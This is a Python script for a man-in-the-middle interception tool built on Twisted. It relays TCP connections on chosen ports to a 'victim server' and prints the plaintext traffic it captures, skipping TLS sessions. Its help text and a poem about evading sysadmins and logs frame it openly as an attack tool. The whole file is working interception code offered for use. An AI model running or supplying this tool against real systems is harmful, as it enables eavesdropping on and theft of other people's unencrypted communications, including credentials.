import os
import time
import socket
import argparse
from platform import node, system, release
from twisted.internet import error
from twisted.internet import reactor
from twisted.internet import protocol
from twisted.protocols.portforward import ProxyClient
from twisted.protocols.portforward import ProxyFactory
from twisted.protocols.portforward import ProxyClientFactory

Node, System, Release = node(), system(), release()

os.system("clear" if os.name == "posix" else "cls")

def baner():
    print(
        """
 _______             ___    ___ _                       _    ___    ___             
(_______)           / __)  / __|_)                     (_)  / __)  / __)            
    _  ____ _____ _| |__ _| |__ _  ____ _____ ___ ____  _ _| |__ _| |__ _____  ____ 
   | |/ ___|____ (_   __|_   __) |/ ___|_____)___)  _ \| (_   __|_   __) ___ |/ ___)
   | | |   / ___ | | |    | |  | ( (___     |___ | | | | | | |    | |  | ____| |    
   |_|_|   \_____| |_|    |_|  |_|\____)    (___/|_| |_|_| |_|    |_|  |_____)_|    
                                                                        
                                    by: errorfiathck
"""
    )



class Proxy(protocol.Protocol):
    noisy = True
    peer = None
    intercept = True

    def setPeer(self, peer):
        self.peer = peer

    def connectionLost(self, reason):
        if self.peer is not None:
            self.peer.transport.loseConnection()
            self.peer = None
        elif self.noisy:
            print("Unable to connect to peer: %s" % (reason,))

    def dataReceived(self, data):
        self.peer.transport.write(data)
        # SSL/TLS handshake
        if self.intercept and data.startswith("\x16\x03"):
            self.intercept = False
            print(
                "\033[91m[!] %s: Disabling interception of SSL traffic: " \
                "%s:%d\033[0m" % (
                    time.strftime("%H:%M:%S"),
                    self.peer.transport.getPeer().host,
                    self.peer.transport.getPeer().port
                )
            )
        if self.intercept:
            print(data)


class ProxyServer(Proxy):
    clientProtocolFactory = ProxyClientFactory
    reactor = None

    def connectionMade(self):
        self.transport.pauseProducing()
        # TODO RTFM and tidy this ugly hack to determine port
        target_port = int(str(self.transport).split("on ")[1].rstrip()[:-1])

        client = self.clientProtocolFactory()
        client.setServer(self)

        if self.reactor is None:
            self.reactor = reactor

        print(
            "\033[94m[+] %s: %s connected to TCP %s:%d->%s:%d\033[0m" % (
                time.strftime("%H:%M:%S"),
                self.transport.getHost().host,
                self.transport.getPeer().host,
                self.transport.getPeer().port,
                self.factory.host,
                target_port
            )
        )
        self.reactor.connectTCP(self.factory.host, target_port, client)


class MitmFactory(protocol.Factory):
    protocol = ProxyServer

    def __init__(self, host):
        self.host = host


def main():
    baner()

    desc = "MITM plaintext comms"
    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("--ip", "-i", type=str, required=True, help="victim server")
    parser.add_argument("--port", "-p", type=str, required=True,
                        help="single victim port or comma separated victim ports")
    args = parser.parse_args()

    try:
        socket.inet_pton(socket.AF_INET, args.ip)
    except AttributeError:
        try:
            socket.inet_aton(args.ip)
        except socket.error:
            print("[!] Invalid IPv4")
            return
    except socket.error:
        print("[!] Invalid IPv4")
        return

    ports = args.port.split(",")
    factory = MitmFactory(args.ip)
    print("\033[1mZerodays burn \033[91mred\033[0m,\033[0m")
    print("\033[1mSysadmins turn \033[94mblue\033[0m,\033[0m")
    print("\033[1mReading logs is \033[91mhard\033[0m,\033[0m")
    print("\033[1mWhy would \033[94myou\033[0m?\033[0m\n\n")

    for port in ports:
        port = int(port)
        try:
            reactor.listenTCP(port, factory)
        except error.CannotListenError:
            print("\033[91m[!] %s: TCP 0.0.0.0:%d->%s:%d\033[0m" %
                (time.strftime("%H:%M:%S"), port, args.ip, port)
            )
        else:
            print("\033[92m[+] %s: TCP 0.0.0.0:%d->%s:%d\033[0m" %
                (time.strftime("%H:%M:%S"), port, args.ip, port)
            )
    reactor.run()

if __name__ == '__main__':
    main()